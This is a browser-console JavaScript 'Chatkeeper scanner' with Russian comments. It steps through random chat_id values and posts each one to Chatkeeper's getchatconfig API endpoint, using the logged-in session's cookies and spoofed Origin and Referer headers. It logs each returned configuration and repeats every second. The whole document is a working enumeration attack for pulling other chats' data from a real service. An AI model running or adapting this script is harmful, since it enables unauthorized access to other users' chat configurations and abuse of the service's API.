if (window.__chatkeeperScannerRunning) {
  console.log("⛔️ Скрипт уже запущен. Второй запуск блокируется.");
} else {
  window.__chatkeeperScannerRunning = true;
  console.log("✅ Запуск Chatkeeper-сканера");

  let chatId = -1001000000000;
  const MIN_CHAT_ID = -1003000000000;
  const MAX_CHAT_ID = -1001000000000;

  async function sendRequest() {
    try {
      const response = await fetch('https://api.chatkeeper.app/cabinet/v1/tg/getchatconfig', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          'Accept': 'application/json, text/plain, */*',
          'Origin': 'https://cabinet.chatkeeper.app',
          'Referer': 'https://cabinet.chatkeeper.app/',
        },
        credentials: 'include',
        body: JSON.stringify({ chat_id: chatId.toString() }),
      });

      const contentType = response.headers.get('Content-Type') || '';
      let body;
      if (contentType.includes('application/json')) {
        body = await response.json();
      } else {
        body = await response.text();
      }

      console.log(`✅ Response (${response.status}) for chat_id ${chatId}:`, body);
    } catch (error) {
      console.error(`❌ Fetch error for chat_id ${chatId}:`, error);
    }

    // Декремент с рандомом
    chatId -= getRandomStep();

    if (chatId < MIN_CHAT_ID || chatId > MAX_CHAT_ID) {
      chatId = MAX_CHAT_ID - Math.floor(Math.random() * 500000);
    }

    setTimeout(sendRequest, 1001);
  }

  function getRandomStep() {
    return 500 + Math.floor(Math.random() * 2000);
  }

  sendRequest();
}
